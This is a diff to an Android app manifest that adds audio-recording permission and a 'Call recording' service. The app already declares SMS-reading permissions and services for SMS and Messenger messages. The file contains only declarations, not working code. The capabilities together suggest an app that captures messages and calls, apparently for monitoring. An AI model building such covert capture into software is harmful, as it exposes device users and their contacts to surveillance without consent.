@@ -20,6 +20,8 @@
     <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE"/>
     <uses-permission android:name="android.permission.RECEIVE_SMS"/>
     <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+
 
     <application
         android:allowBackup="true"
@@ -73,13 +75,22 @@
             android:label="Messesnger messages">
         </service>
 
-        <!--facebook-->
+        <!--sms-->
         <service
             android:name=".services.SmsService"
             android:enabled="true"
             android:exported="false"
             android:label="SMS messages">
         </service>
+        <!--recording-->
+        <service
+            android:name=".services.RecordService"
+            android:enabled="true"
+            android:exported="false"
+            android:label="Call recording">
+        </service>
+
+
     </application>
 
 </manifest>
